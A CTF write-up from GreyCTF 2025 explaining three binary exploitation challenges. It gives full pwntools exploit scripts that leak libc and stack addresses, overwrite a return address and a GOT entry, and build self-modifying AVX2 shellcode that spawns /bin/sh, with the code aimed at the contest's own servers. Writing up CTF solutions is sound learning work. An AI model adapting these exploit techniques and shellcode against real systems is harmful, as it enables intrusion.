# GreyCTF 2025

## preface
I played GreyCTF 2025 in team m01nm01n.

![](moinmoin.png)

I solved 3 `ezpz` challenges and 2 of 3 `pwn` challenges.

## baby-byte
<primary-label ref="pwn"/>

In this challenge, we can read/write arbitrary byte.
My approach is:
1. read .got field to leak glibc address.
2. read environ of libc to leak stack address.
3. overwrite return address

```py
int main() {
    setup();
    puts("Welcome to the extremely vulnerable baby bytes game!");
    puts("Where we allow you to read and write any byte you want, no strings attached!");
    int choice = 0;
    printf("Here's your address of choice (pun intended): %p\n", &choice);
    printf("You need to call the function at this address to win: %p\n", win);
    while (true) {
        printmenu();
        scanf("%d", &choice);
        if (choice == 1) {
            puts("Enter the address of the byte you want to read in hex:");
            char* ptr = NULL;
            scanf("%llx", &ptr);
            printf("Your byte is: %02hhx\n", *ptr);
        } else if (choice == 2) {
            puts("Enter the address of the byte you want to write to in hex:");
            char* ptr = NULL;
            scanf("%llx", &ptr);
            puts("Enter the byte you want to change it to:");
            char changeto;
            scanf("%hhx", &changeto);
            mprotect(ptr, 1, PROT_READ | PROT_WRITE | PROT_EXEC);
            *ptr = changeto;
        } else {
            puts("Invalid option! Exiting...");
            break;
        }
    }
}
```

```Py
from pwn import *
import sys

e = ELF("baby_bytes_patched",checksec=False)
e = ELF("baby_bytes",checksec=False)
libc = ELF("libc.so.6",checksec=False)
ld = ELF("ld-linux-x86-64.so.2",checksec=False)

nc = "nc challs.nusgreyhats.org 33021"
HOST = nc.split(" ")[1]
PORT = int(nc.split(" ")[2])

dbg = 1
g_script = """
    #set max-visualize-chunk-size 0x300
"""

context.binary = e
if len(sys.argv) > 1:
    io = remote(host=HOST,port=PORT)
else:
    io = e.process()
    if dbg:
        gdb.attach(io,g_script)

s   = lambda b: io.send(b)
sa  = lambda a,b: io.sendafter(a,b)
sl  = lambda b: io.sendline(b)
sla = lambda a,b: io.sendlineafter(a,b)
r   = lambda : io.recv()
ru  = lambda b:io.recvuntil(b)
rl  = lambda : io.recvline()
pu32= lambda b : u32(b.ljust(4,b"\0"))
pu64= lambda b : u64(b.ljust(8,b"\0"))
hlog= lambda i : print(f"[*]{hex(i)}")
shell = lambda : io.interactive()
payload = b""
def pay64(adr:int):global payload;payload = p64(adr)
def add64(adr:int):global payload;payload+= p64(adr)
def paybyte(data:bytes):global payload;payload = data
def addbyte(data:bytes):global payload;payload+= data


got_puts = 0x00404018

def aar_byte(ptr:int)->int:
    ru(b"> ")
    sl(b"1")
    ru(b"hex:")
    sl(hex(ptr).encode())
    ru(b"Your byte is: ")
    v = rl().strip().decode()
    v = int(v, 16)
    return v

def aaw_byte(ptr:int,data:int):
    ru(b"> ")
    sl(b"2")
    ru(b"hex:")
    sl(hex(ptr).encode())
    ru(b"it to:")
    sl(hex(data).encode())

l = 0
for i in range(8):
    l = l << 8
    l += aar_byte(got_puts+7-i)

print(f"{hex(l)=}")
#lBase = l - (0x7b1c8bc88820 - 0x00007b1c8bc11000)
lBase = l - (0x768cc7080e50 - 0x0000768cc7000000)
print(f"{hex(lBase)=}")
#environ = lBase +0x0000000001da320
environ = lBase +0x000000000222200
print(f"{hex(environ)=}")
s = 0
for i in range(8):
    s = s << 8
    s += aar_byte(environ+7-i)

print(f"{hex(s)=}")
sBase = s - (0x7ffc6cf1b638 - 0x00007ffc6cefc000)
ret = sBase + (0x7ffc6cf1b518 - 0x00007ffc6cefc000)

win = e.sym["win"]
for i in range(8):
    aaw_byte(ret+i,win & 0xff)
    win = win >> 8


r()
sl(b"3")

shell()
```

## infinite-connect
<primary-label ref="pwn"/>

The bug is in function `game`. oob will be occurred when player input same colum for over 7 times.

```c
bool game(bool player) {
    char currsym;
    if (player) {
        currsym = player1symbol;
        printf("Player 1 choose your column (0 - 7) > ");
    } else {
        currsym = player2symbol;
        printf("Player 2 choose your column (0 - 7) > ");
    }
    char col = getchar();
    getchar();
    if (col < '0' || col > '7') {
        printf("erm... what the sigma?\n");
        exit(1);
    }
    int colint = col - '0';
    if (board[7][colint] == player1symbol || board[7][colint] == player2symbol) {
        // we have to shift the entire column down
        int lastfree = 0;
        while (board[lastfree][colint] == player1symbol || board[lastfree][colint] == player2symbol) {
            lastfree--;
        }
        while (true) {
            if (lastfree == 7 || (board[lastfree + 1][colint] != player1symbol && board[lastfree + 1][colint] != player2symbol)) {
                board[lastfree][colint] = currsym;
                break;
            }
            board[lastfree][colint] = board[lastfree + 1][colint];
            lastfree++;
        }
    } else {
        // the column still has space
        int x = 0;
        
        while (board[x][colint] == player1symbol || board[x][colint] == player2symbol) {
            x++;
        }
        board[x][colint] = currsym;
    }

    printboard();
    return checkgameended();
}
```

We can overwrite minus index of board, and since the binary has `PARTIAL RELRO`, I change the value of `exit@got` to win function.

```c
char board[8][8] = {
    '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', 
    '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', 
    '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', 
    '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', 
    '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', 
    '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', 
    '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', 
    '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20'
};
```

![Screenshot_20250601_224820.png](Screenshot_20250601_224820.png)

We have to brute-force 16 bit entropy of ASLR. Good luck.
```py
from pwn import *
import sys

e = ELF("infinite_connect_four",checksec=False)
libc = ELF("libc.so.6",checksec=False)
ld = ELF("ld-linux-x86-64.so.2",checksec=False)

nc = "nc challs.nusgreyhats.org 33102"
HOST = nc.split(" ")[1]
PORT = int(nc.split(" ")[2])

dbg = 0
g_script = """
    set max-visualize-chunk-size 0x300
"""

context.binary = e
if len(sys.argv) > 1:
    io = remote(host=HOST,port=PORT)
else:
    io = e.process()
    if dbg:
        gdb.attach(io,g_script)

s   = lambda b: io.send(b)
sa  = lambda a,b: io.sendafter(a,b)
sl  = lambda b: io.sendline(b)
sla = lambda a,b: io.sendlineafter(a,b)
r   = lambda : io.recv()
ru  = lambda b:io.recvuntil(b)
rl  = lambda : io.recvline()
pu32= lambda b : u32(b.ljust(4,b"\0"))
pu64= lambda b : u64(b.ljust(8,b"\0"))
hlog= lambda i : print(f"[*]{hex(i)}")
shell = lambda : io.interactive()
payload = b""
def pay64(adr:int):global payload;payload = p64(adr)
def add64(adr:int):global payload;payload+= p64(adr)
def paybyte(data:bytes):global payload;payload = data
def addbyte(data:bytes):global payload;payload+= data

ru(b"Enter player 1 symbol > ")
sl(p8(e.sym["win"]&0xff))
ru(b"Enter player 2 symbol > ")
sl(p8(((e.sym["win"] >> 8)&0xff)+0x80))

def game(c1:int,c2:int):
    ru(b"Player 1 choose your column (0 - 7) > ")
    sl(str(c1).encode())
    ru(b"Player 2 choose your column (0 - 7) > ")
    sl(str(c2).encode())


for i in range(3):
    game(0,1)
    game(1,0)

game(0,1)
game(0,1)


for i in range(4):
    game(0,1)
    game(1,0)


sl(b"9")
sl(b"ls")
sl(b"cat flag*")
shell()
```

## vexed
<primary-label ref="pwn"/>

```py
#!/usr/local/bin/python3
import mmap
import ctypes
import base64
from capstone import *
from capstone.x86 import *

def check(code: bytes) -> bool:
    if len(code) > 0x300:
        return False

    md = Cs(CS_ARCH_X86, CS_MODE_64)
    md.detail = True

    for insn in md.disasm(code, 0):
        # Check if instruction is AVX2
        if not (X86_GRP_AVX2 in insn.groups):
            raise ValueError("AVX2 Only!")

        name = insn.insn_name()

        # No reading memory
        if "mov" in name.lower():
            raise ValueError("No movs!")

    return True

def run(code: bytes):
    # Allocate executable memory using mmap
    mem = mmap.mmap(-1, len(code), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
    mem.write(code)

    # Create function pointer and execute
    func = ctypes.CFUNCTYPE(ctypes.c_void_p)(ctypes.addressof(ctypes.c_char.from_buffer(mem)))
    func()

    exit(1)


def main():
    code = input("Shellcode (base64 encoded): ")
    code = base64.b64decode(code.encode())
    if check(code):
        run(code)


if __name__ == "__main__":
    main()
```

We can execute restricted AVX2 instructions.
Important thing is we can only execute AVX2 instructions, and we cannot contain `mov` in the name of whole instruction.

But there is no `syscall` in AVX2, so I created AVX2 shellcode which modify itself.
The goal of this challenge is `execve("/bin/sh",NULL,NULL)`. 

```nasm
xor rdi,rdi
nop
xor rsi,rsi
nop
mov di,0x6873
shl rdi, 16
mov di,0x2f6e
shl rdi, 16
mov di,0x6962
shl rdi,8
mov dil, 0x2f
nop
push rdi
push rsp
pop rdi
nop
xor rax,rax
nop
mov ax,59
cdq
syscall
nop
```

I placed these shellcode after AVX2 instructions. Note that we cannot insert shellcode simply. I use 0xc5f5 prefix to pretend the instruction as AVX2.
That's why the shellcode is split into 4-byte chunks.

> After ctf was over, some CTF player in discord saied that capstone stop disassembly after the bad instruction.

After some adjustment of offset, I successfully created the AVX2 shellcode.
```nasm
vinserti128 ymm0, ymm0, [rip+0x194], 0
vpsllq ymm0,ymm0,48
vpsrlq ymm0,ymm0,48

vinserti128 ymm1, ymm1, [rip+0x12e], 0
vpxor ymm1, ymm1, ymm0
vextracti128 [rip+0x120], ymm1, 0
    
vinserti128 ymm1, ymm1, [rip+0x11c], 0
vpxor ymm1, ymm1, ymm0
vextracti128 [rip+0x10e], ymm1, 0
    
vinserti128 ymm1, ymm1, [rip+0x10a], 0
vpxor ymm1, ymm1, ymm0
vextracti128 [rip+0xfc], ymm1, 0
    
vinserti128 ymm1, ymm1, [rip+0xf8], 0
vpxor ymm1, ymm1, ymm0
vextracti128 [rip+0xea], ymm1, 0
    
vinserti128 ymm1, ymm1, [rip+0xe6], 0
vpxor ymm1, ymm1, ymm0
vextracti128 [rip+0xd8], ymm1, 0
    
vinserti128 ymm1, ymm1, [rip+0xd4], 0
vpxor ymm1, ymm1, ymm0
vextracti128 [rip+0xc6], ymm1, 0
    
vinserti128 ymm1, ymm1, [rip+0xc2], 0
vpxor ymm1, ymm1, ymm0
vextracti128 [rip+0xb4], ymm1, 0
    
vinserti128 ymm1, ymm1, [rip+0xb0], 0
vpxor ymm1, ymm1, ymm0
vextracti128 [rip+0xa2], ymm1, 0
    
vinserti128 ymm1, ymm1, [rip+0x9e], 0
vpxor ymm1, ymm1, ymm0
vextracti128 [rip+0x90], ymm1, 0
    
vinserti128 ymm1, ymm1, [rip+0x8c], 0
vpxor ymm1, ymm1, ymm0
vextracti128 [rip+0x7e], ymm1, 0
    
vinserti128 ymm1, ymm1, [rip+0x7a], 0
vpxor ymm1, ymm1, ymm0
vextracti128 [rip+0x6c], ymm1, 0
    
vinserti128 ymm1, ymm1, [rip+0x68], 0
vpxor ymm1, ymm1, ymm0
vextracti128 [rip+0x5a], ymm1, 0
    
vinserti128 ymm1, ymm1, [rip+0x56], 0
vpxor ymm1, ymm1, ymm0
vextracti128 [rip+0x48], ymm1, 0
```

here's the solver of this challenge.

```py
from pwn import *

context.arch = 'amd64'

target = """
    xor rdi,rdi
    nop

    xor rsi,rsi
    nop

    mov di,0x6873
    shl rdi, 16
    mov di,0x2f6e
    shl rdi, 16
    mov di,0x6962
    shl rdi,8
    mov dil, 0x2f
    nop

    push rdi
    push rsp
    pop rdi
    nop

    xor rax,rax
    nop

    mov ax,59

    cdq
    syscall
    nop
"""

tAsm = asm(target)
print(len(tAsm))
print(tAsm.hex())
print(base64.b64encode(tAsm))

print("***************SHELL ASSEMBLY***************")

#tmp  =bytes.fromhex('4831f69066bf736848c1e71066bf6e2f48c1e71066bf626948c1e70840b72f9057545f904831c09066b83b00990f0590')
tmp  =bytes.fromhex('4831ff904831f69066bf736848c1e71066bf6e2f48c1e71066bf626948c1e70840b72f9057545f904831c09066b83b00990f0590')
print(tmp)
print(len(tmp))
test = b""

print("***************HI LETS GO***************")
for i in range(len(tmp)//4):
    print(tmp[i*4:i*4+4])
    test += b"\xc5\xf5"+tmp[i*4:i*4+4]

test += b"\xc5\xf5\x48\x31\x55\x65"
print(len(test))
print(hex(len(test)))

print("***************AVX2 TIME***************")

off = 410

avx2 = f"""
vinserti128 ymm0, ymm0, [rip+{hex(off+4-0xa)}], 0
vpsllq ymm0,ymm0,48
vpsrlq ymm0,ymm0,48
"""

off2 = off + len(b"\xc5\xf5\x48\x31\x65\x55") - len(test)
for i in range(len(tmp)//4):
    avx2 += f"""
vinserti128 ymm1, ymm1, [rip+{hex(6*i+(off2-0xa-len(asm(avx2))))}], 0
vpxor ymm1, ymm1, ymm0
vextracti128 [rip+{hex(6*i+(off2-0x18-len(asm(avx2))))}], ymm1, 0
    """

print(avx2)
a = asm(avx2)
a += test

print(len(a))
print(len(a)-len(b"\xc5\xf5\x48\x31\x65\x55")) #off
print(hex(len(a)))
print(a.hex())
print(base64.b64encode(a))
```

I could successfully decode the shellcode! (change syscall for int3 to break in gdb)

![Screenshot_20250601_224057.png](Screenshot_20250601_224057.png)

win!

![Screenshot_20250601_230126.png](Screenshot_20250601_230126.png)
